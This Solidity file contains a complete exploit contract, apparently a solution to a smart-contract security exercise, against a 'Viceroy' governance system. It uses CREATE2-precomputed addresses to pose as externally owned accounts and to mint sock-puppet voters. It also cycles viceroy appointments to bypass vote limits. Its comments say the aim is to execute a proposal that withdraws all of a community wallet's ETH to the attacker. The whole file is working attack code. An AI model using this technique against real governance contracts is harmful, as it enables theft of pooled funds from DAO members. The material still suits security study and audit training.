pragma solidity 0.8.15;

import {Governance,OligarchyNFT} from  "../Viceroy.sol";
 
contract GovernanceAttacker {

    address private attackerWallet; 
    Governance _governance;
    
    constructor(){
        attackerWallet = msg.sender;
    }

    function attack(address governanceAddress,bytes calldata proposal) external {
        
        _governance = Governance(governanceAddress);

        // below number as salt to generate voter address and Viceroy address
        uint8[5] memory voter1_salt_nums = [11,12,13,14,15];
        uint8[5] memory voter2_salt_nums = [21,22,23,24,25];
        uint8 falseEOAViceroy_saltNum_1 = 1;
        uint8 falseEOAViceroy_saltNum_2 = 2;

        // generate first ViceroyAddress then let the attacker approve it as  Viceroy.
        address falseEOAViceroy_1 =  precomputeAddressBySaltNumber(falseEOAViceroy_saltNum_1); // salt as 1
        _governance.appointViceroy(falseEOAViceroy_1, 1);
        require(createOneContractBySaltNumber(falseEOAViceroy_saltNum_1) == falseEOAViceroy_1,"check generate address is not correct");

        
        // let the falseEOAAddress_vicery create a proposal whose data call CommunityWallet's exec funtion and then withdraw all its eth to attackWallet
        FalseEOA(falseEOAViceroy_1).createProposal(falseEOAViceroy_1,proposal);
        uint256 proposalId = uint256(keccak256(proposal));

        // generate five new voteraddress, and let falseEOAViceroy_1 make it as voter, then vote the proposalId
        generateVoteAddressWithApprove(falseEOAViceroy_1,voter1_salt_nums);
        createVoteAddressAndVote(falseEOAViceroy_1,voter1_salt_nums,proposalId);


        // let the attacker delete the falseEOAViceroy_1 as Viceroy, make falseEOAViceroy_2 as Viceroy
        _governance.deposeViceroy(falseEOAViceroy_1, 1);
         address falseEOAViceroy_2 =  precomputeAddressBySaltNumber(falseEOAViceroy_saltNum_2);
        _governance.appointViceroy(falseEOAViceroy_2, 1);
        require(createOneContractBySaltNumber(falseEOAViceroy_saltNum_2) == falseEOAViceroy_2,"check generate address is not correct");

        // generate new five voteraddress, and let falseEOAViceroy_2 make it as voter, then vote the proposalId
        generateVoteAddressWithApprove(falseEOAViceroy_2,voter2_salt_nums);
        createVoteAddressAndVote(falseEOAViceroy_2,voter2_salt_nums,proposalId);
       
        _governance.executeProposal(proposalId);

    }

    /**
    generate the voteAddress by saleNum, then make it as a voter by viceroy
     */
    function generateVoteAddressWithApprove(address viceroyAddress,uint8[5] memory salteNumbers ) private {

        for(uint i = 0;i<salteNumbers.length;i++){
            address voteAddress = precomputeAddressBySaltNumber(salteNumbers[i]);
            FalseEOA(viceroyAddress).approveVoter(voteAddress);
        }
    }

    function createVoteAddressAndVote(address viceroyAddress,uint8[5] memory salteNumbers,uint proposalId) private {

        for(uint i = 0;i<salteNumbers.length;i++){
            address voter_address =  createOneContractBySaltNumber(salteNumbers[i]);
            FalseEOA(voter_address).voteOnProposal(proposalId,true,viceroyAddress);
        }

    }
    
    function createOneContractBySaltNumber(uint salt_number) private returns(address generateAddress) {
        
        bytes memory bytecode = abi.encodePacked(type(FalseEOA).creationCode, abi.encode(address(_governance)));
        bytes32 salt = keccak256(abi.encodePacked(uint(salt_number)));
        assembly {
            generateAddress := create2(0, add(bytecode, 32), mload(bytecode), salt)
        }
    } 
    
    function precomputeAddressBySaltNumber(uint salt_number) private returns(address) {

        bytes memory bytecode = abi.encodePacked(type(FalseEOA).creationCode, abi.encode(address(_governance)));
        bytes32 salt = keccak256(abi.encodePacked(uint(salt_number)));

        return getAddress(bytecode, salt, address(this));
    }


    function getAddress(bytes memory bytecode, bytes32 _salt, address factory) internal view returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), factory, _salt, keccak256(bytecode)));

        return address(uint160(uint256(hash)));
    }
}


//  Because no matter the Viceroy or the voter should be EOA. precompute the address before create the contract
contract FalseEOA{

    Governance immutable private _governance;

    constructor(address governanceAddress){
        _governance = Governance(governanceAddress);
    }

    function voteOnProposal(uint256 proposal, bool inFavor, address viceroy) public{

        _governance.voteOnProposal(proposal,inFavor,viceroy);

    }

    function createProposal(address viceroy, bytes calldata proposal) public {

        _governance.createProposal(viceroy,proposal);
    }


    function approveVoter(address voter) external {

         _governance.approveVoter(voter);
    }

}